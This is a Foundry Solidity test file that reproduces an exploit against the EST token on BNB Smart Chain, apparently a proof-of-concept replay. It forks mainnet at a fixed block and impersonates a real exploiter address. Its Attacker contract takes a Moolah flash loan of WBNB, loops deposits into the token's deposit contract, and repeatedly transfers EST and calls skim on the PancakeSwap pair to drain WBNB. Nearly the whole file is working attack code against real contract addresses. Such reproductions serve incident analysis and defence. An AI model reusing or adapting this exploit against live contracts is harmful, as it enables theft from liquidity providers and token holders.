// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {console, Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IWBNB, IUniswapRouter2, IUniswapPair2, IMoolah, IMoolahFlashLoanCallback} from "./interfaces.sol";

address constant REAL_EXPLOITER = address(0xCF300DE6F177ec10DB0d7f756ced3Ae2D2203BFd);
address constant EST = address(0xD4524Be41cd452576aB9FF7b68a0b89aF8498a91);
address constant MOOLAH = address(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
address constant WBNB = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
address constant PANCAKE_ROUTER_2 = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);

contract ESTTest is Test {
    uint256 internal constant FORK_BLOCK = 89060337 - 1;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", string("bsc")), FORK_BLOCK);

        vm.label(EST, "[EST]");
        vm.label(MOOLAH, "[Moolah]");
        vm.label(WBNB, "[WBNB]");
        vm.label(IEST(EST).uniswapV2Pair(), "[PancakePair]");
        vm.label(IEST(EST).depositContract(), "[BNBDeposit]");
    }

    function testExploit() public {
        (address msgSender, uint256 senderPrivKey) = makeAddrAndKey("[FakeExploiter]");

        console.log("[Before] msgSender", IWBNB(WBNB).balanceOf(msgSender));
        console.log("[Before] PancakePair", IWBNB(WBNB).balanceOf(IEST(EST).uniswapV2Pair()));

        vm.startPrank(REAL_EXPLOITER); // exploiter buy EST from others with high price
        IEST(EST).transfer(msgSender, 2 ether);
        vm.stopPrank();

        vm.startPrank(msgSender, msgSender);
        vm.signAndAttachDelegation(address(new Attacker()), senderPrivKey);
        Attacker(payable(msgSender)).start(20000 ether);
        vm.stopPrank();

        console.log("[After] msgSender", IWBNB(WBNB).balanceOf(msgSender));
        console.log("[After] PancakePair", IWBNB(WBNB).balanceOf(IEST(EST).uniswapV2Pair()));
    }
}

interface IEST is IERC20 {
    function uniswapV2Pair() external view returns (address);
    function depositContract() external view returns (address);
}

interface IBNBDeposit {
    function deposit() external payable;
    function maxDeposit() external view returns (uint256);
    function totalLP() external view returns (uint256);
    function userInfo(address) external view returns (address, uint256, uint256, uint256, uint256, uint256, bool);
}

contract Attacker is IMoolahFlashLoanCallback {
    constructor() {}

    receive() external payable {}

    function start(uint256 _amount) public {
        IMoolah moolah = IMoolah(MOOLAH);

        require(_amount <= IWBNB(WBNB).balanceOf(MOOLAH));

        IWBNB(WBNB).approve(MOOLAH, _amount);

        moolah.flashLoan(WBNB, _amount, "");
    }

    function onMoolahFlashLoan(uint256, bytes calldata) external {
        IWBNB wbnb = IWBNB(WBNB);
        IEST est = IEST(EST);
        IUniswapPair2 uniswapPair = IUniswapPair2(est.uniswapV2Pair());
        IBNBDeposit bnbDeposit = IBNBDeposit(est.depositContract());

        uint256 depositPerTime = bnbDeposit.maxDeposit();
        wbnb.withdraw(depositPerTime * 30);
        while (address(this).balance > depositPerTime) {
            bnbDeposit.deposit{value: depositPerTime}();
        }

        swapToken(address(bnbDeposit), WBNB, EST, 400 ether);

        est.transfer(address(bnbDeposit), 1 ether);

        swapToken(address(bnbDeposit), WBNB, EST, wbnb.balanceOf(address(this)));

        for (uint256 i = 0; i < 100; i++) {
            uint256 amount = est.balanceOf(address(uniswapPair)) * 10 / 95;
            est.transfer(address(uniswapPair), amount);
            uniswapPair.skim(address(bnbDeposit));
        }

        swapToken(address(this), EST, WBNB, est.balanceOf(address(this)));

        wbnb.balanceOf(address(this));
    }

    function swapToken(address _recipient, address _from, address _to, uint256 _amount) internal {
        IERC20 fromToken = IERC20(_from);
        if (fromToken.allowance(address(this), PANCAKE_ROUTER_2) != type(uint256).max) {
            fromToken.approve(PANCAKE_ROUTER_2, type(uint256).max);
        }

        address[] memory path = new address[](2);
        path[0] = _from;
        path[1] = _to;
        IUniswapRouter2(PANCAKE_ROUTER_2)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(_amount, 0, path, _recipient, block.timestamp + 60);
    }
}
